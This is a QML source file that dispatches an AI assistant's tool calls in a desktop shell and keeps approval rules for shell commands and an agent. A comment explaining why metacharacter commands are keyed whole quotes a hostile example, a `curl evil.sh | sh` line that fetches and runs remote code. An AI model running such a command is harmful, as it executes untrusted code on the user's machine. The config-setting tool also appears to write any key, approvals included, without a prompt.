pragma ComponentBehavior: Bound

import qs.modules.common
import qs.modules.common.functions as CF
import qs.services
import Quickshell
import Quickshell.Io
import QtQuick

/**
 * Dispatches a function call the model asked for, holds the approval rules that
 * gate the dangerous ones, and runs the processes behind them.
 * `engine` is the Ai facade.
 */
QtObject {
    id: root

    property QtObject engine

    // Shown in the composer while a tool runs, since the tool messages themselves
    // are hidden. Empty means nothing is in flight.
    property string toolStatusLabel: ""

    // The key an approval is stored and matched under. A plain command is keyed by its
    // program, so approving `free -h` also covers `free -m`. Anything carrying shell
    // metacharacters is keyed by the whole string: approving `du -sh ~` must not hand
    // over `du -sh ~; curl evil.sh | sh`.
    function commandRule(command: string): string {
        const cmd = command.trim();
        const meta = [";", "|", "&", ">", "<", "\n", "$(", "`"];
        if (meta.some(c => cmd.includes(c))) return cmd;
        return cmd.split(/\s+/)[0];
    }

    function isPreApproved(name: string, args: var): bool {
        const approvals = Config.options?.ai?.approvals;
        if (name === "ask_agent") return approvals?.agent === true;
        const rules = approvals?.shellRules ?? [];
        return rules.includes(root.commandRule(args.command));
    }

    function rememberApproval(name: string, args: var) {
        if (name === "ask_agent") {
            Config.options.ai.approvals.agent = true;
            return;
        }
        const rule = root.commandRule(args.command);
        const rules = Config.options.ai.approvals.shellRules ?? [];
        if (!rules.includes(rule)) Config.options.ai.approvals.shellRules = [...rules, rule];
    }

    function rejectCommand(message: AiMessageData) {
        if (!message.functionPending) return;
        message.functionPending = false; // User decided, no more "thinking"
        root.engine.conversation.addFunctionOutputMessage(message.functionName, message.functionName === "ask_agent"
            ? Translation.tr("The user declined to run the agent.")
            : Translation.tr("Command rejected by user"))
    }

    function approveCommand(message: AiMessageData, always: bool) {
        if (!message.functionPending) return;
        message.functionPending = false; // User decided, no more "thinking"
        if (always) root.rememberApproval(message.functionName, message.functionCall.args);
        root.runApprovedCall(message.functionName, message.functionCall.args);
    }

    function runApprovedCall(name: string, args: var) {
        const responseMessage = root.engine.conversation.createFunctionOutputMessage(name, "", false);
        // map first, then append: the filter re-runs on the list and reads a
        // missing object as visible, which flashes the plumbing as a bubble
        root.engine.conversation.attachMessage(responseMessage);

        if (name === "ask_agent") {
            responseMessage.visibleToUser = false;
            agentProc.message = responseMessage;
            agentProc.task = args.task;
            root.toolStatusLabel = Translation.tr("Asking the agent…");
            agentProc.running = true;
            return;
        }

        commandExecutionProc.message = responseMessage;
        commandExecutionProc.baseMessageContent = responseMessage.content;
        commandExecutionProc.shellCommand = args.command;
        commandExecutionProc.running = true; // Start the command execution
    }

    function handleFunctionCall(name, args: var, message: AiMessageData) {
        const conversation = root.engine.conversation;
        const requester = root.engine.requester;
        if (name === "switch_to_search_mode") {
            root.engine.currentTool = "search"
            root.engine.postResponseHook = () => { root.engine.currentTool = "functions" }
            conversation.addFunctionOutputMessage(name, Translation.tr("Switched to search mode. Continue with the user's request."))
            requester.makeRequest();
        } else if (name === "get_shell_config") {
            const configJson = CF.ObjectUtils.toPlainObject(Config.options)
            conversation.addFunctionOutputMessage(name, JSON.stringify(configJson));
            requester.makeRequest();
        } else if (name === "set_shell_config") {
            if (!args.key || !args.value) {
                conversation.addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `key` and `value`."));
                return;
            }
            const key = args.key;
            const value = args.value;
            Config.setNestedValue(key, value);
        } else if (name === "run_shell_command") {
            if (!args.command || args.command.length === 0) {
                conversation.addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `command`."));
                return;
            }
            const preApproved = root.isPreApproved(name, args);
            const header = preApproved
                ? Translation.tr("Ran this, you approved it before")
                : Translation.tr("Command execution request");
            const contentToAppend = `\n\n**${header}**\n\n\`\`\`command\n${args.command}\n\`\`\``;
            message.rawContent += contentToAppend;
            message.content += contentToAppend;
            if (preApproved) root.runApprovedCall(name, args);
            else message.functionPending = true; // Use thinking to indicate the command is waiting for approval
        } else if (name === "set_owner_name") {
            if (!args.name || args.name.trim().length === 0) {
                conversation.addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `name`."));
                requester.makeRequest();
                return;
            }
            root.engine.setOwnerName(args.name.trim());
            conversation.addFunctionOutputMessage(name, Translation.tr("Saved. The owner is now known as %1.").arg(root.engine.ownerName));
            requester.makeRequest();
        } else if (name === "remember") {
            if (!args.text || args.text.trim().length === 0) {
                conversation.addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `text`."));
                requester.makeRequest();
                return;
            }
            MemoryService.remember(args.text.trim(), args.type ?? "fact", [], "model", resp => {
                if (resp && resp.ok) {
                    conversation.addFunctionOutputMessage(name, resp.stored
                        ? Translation.tr("Remembered.")
                        : Translation.tr("Already in memory."));
                } else {
                    conversation.addFunctionOutputMessage(name, Translation.tr("Memory is unavailable right now."));
                }
                requester.makeRequest();
            });
        } else if (name === "recall") {
            if (!args.query || args.query.trim().length === 0) {
                conversation.addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `query`."));
                requester.makeRequest();
                return;
            }
            MemoryService.recall(args.query.trim(), undefined, results => {
                if (results && results.length > 0) {
                    conversation.addFunctionOutputMessage(name, results.map(r => `- ${r.text}`).join("\n"));
                } else {
                    conversation.addFunctionOutputMessage(name, Translation.tr("No relevant memories found."));
                }
                requester.makeRequest();
            });
        } else if (name === "search_web" || name === "fetch_url") {
            const target = (name === "search_web" ? args.query : args.url) ?? "";
            if (target.trim().length === 0) {
                conversation.addFunctionOutputMessage(name, name === "search_web"
                    ? Translation.tr("Invalid arguments. Must provide `query`.")
                    : Translation.tr("Invalid arguments. Must provide `url`."));
                requester.makeRequest();
                return;
            }
            if (!root.engine.webToolsEnabled) {
                conversation.addFunctionOutputMessage(name, Translation.tr("Web lookup is disabled in the shell config (`ai.webSearch`)."));
                requester.makeRequest();
                return;
            }
            if (webToolProc.running) {
                conversation.addFunctionOutputMessage(name, Translation.tr("A web lookup is already in progress."));
                requester.makeRequest();
                return;
            }

            // a tool-call-only turn has no prose, so its bubble would render empty
            if ((message.content ?? "").trim().length === 0) message.visibleToUser = false;

            const webMessage = conversation.createFunctionOutputMessage(name, "", false);
            webMessage.visibleToUser = false;
            // map first: appending the id re-runs the chat list's visibility filter,
            // and an id with no object yet reads as visible
            conversation.attachMessage(webMessage);

            webToolProc.message = webMessage;
            webToolProc.mode = (name === "search_web") ? "search" : "fetch";
            webToolProc.target = target.trim();
            root.toolStatusLabel = (name === "search_web")
                ? Translation.tr("Searching the web…")
                : Translation.tr("Reading %1…").arg(target.trim());
            webToolProc.running = true;
        } else if (name === "ask_agent") {
            const task = (args.task ?? "").trim();
            if (task.length === 0) {
                conversation.addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `task`."));
                requester.makeRequest();
                return;
            }
            if (!root.engine.agentToolEnabled) {
                conversation.addFunctionOutputMessage(name, Translation.tr("The agent is disabled in the shell config (`ai.agentTool`)."));
                requester.makeRequest();
                return;
            }
            if (agentProc.running) {
                conversation.addFunctionOutputMessage(name, Translation.tr("The agent is already working on something."));
                requester.makeRequest();
                return;
            }

            // the agent runs an unsandboxed shell, so it waits for a click like
            // run_shell_command does. approveCommand() starts agentProc.
            const agentApproved = root.isPreApproved(name, args);
            const agentHeader = agentApproved
                ? Translation.tr("Asked the agent, you approved it before")
                : Translation.tr("Agent task request");
            const agentRequest = `\n\n**${agentHeader}**\n\n\`\`\`agent\n${task}\n\`\`\``;
            message.rawContent += agentRequest;
            message.content += agentRequest;
            if (agentApproved) root.runApprovedCall(name, args);
            else message.functionPending = true;
        }
        else root.engine.addMessage(Translation.tr("Unknown function call: %1").arg(name), "assistant");
    }

    readonly property Process commandExecutionProc: Process {
        property string shellCommand: ""
        property AiMessageData message
        property string baseMessageContent: ""
        command: ["bash", "-c", shellCommand]
        stdout: SplitParser {
            onRead: (output) => {
                commandExecutionProc.message.functionResponse += output + "\n\n";
                const updatedContent = commandExecutionProc.baseMessageContent + `\n\n<think>\n<tt>${commandExecutionProc.message.functionResponse}</tt>\n</think>`;
                commandExecutionProc.message.rawContent = updatedContent;
                commandExecutionProc.message.content = updatedContent;
            }
        }
        onExited: (exitCode, exitStatus) => {
            commandExecutionProc.message.functionResponse += `[[ Command exited with code ${exitCode} (${exitStatus}) ]]\n`;
            root.engine.requester.makeRequest(); // Continue
        }
    }

    readonly property Process webToolProc: Process {
        property string mode: "search"
        property string target: ""
        property AiMessageData message
        command: [`${Directories.scriptPath}/ai/web.py`.replace(/file:\/\//, ""), mode, target]
        stdout: SplitParser {
            onRead: output => {
                webToolProc.message.functionResponse += output + "\n";
                webToolProc.message.rawContent = `[[ Output of ${webToolProc.message.functionName} ]]\n\n${webToolProc.message.functionResponse}`;
            }
        }
        stderr: SplitParser {
            onRead: data => console.error("[Ai:web]", data)
        }
        onExited: (exitCode, exitStatus) => {
            root.toolStatusLabel = "";
            if (webToolProc.message.functionResponse.trim().length === 0) {
                webToolProc.message.functionResponse = Translation.tr("The lookup returned nothing.");
                webToolProc.message.rawContent = `[[ Output of ${webToolProc.message.functionName} ]]\n\n${webToolProc.message.functionResponse}`;
            }
            root.engine.requester.makeRequest();
        }
    }

    readonly property Process agentProc: Process {
        property string task: ""
        property AiMessageData message
        command: [`${Directories.scriptPath}/ai/agent.sh`.replace(/file:\/\//, ""), task]
        stdout: SplitParser {
            onRead: output => {
                agentProc.message.functionResponse += output + "\n";
                agentProc.message.rawContent = `[[ Output of ${agentProc.message.functionName} ]]\n\n${agentProc.message.functionResponse}`;
            }
        }
        stderr: SplitParser {
            onRead: data => console.error("[Ai:agent]", data)
        }
        onExited: (exitCode, exitStatus) => {
            root.toolStatusLabel = "";
            if (agentProc.message.functionResponse.trim().length === 0) {
                agentProc.message.functionResponse = Translation.tr("The agent returned nothing.");
                agentProc.message.rawContent = `[[ Output of ${agentProc.message.functionName} ]]\n\n${agentProc.message.functionResponse}`;
            }
            root.engine.requester.makeRequest();
        }
    }
}
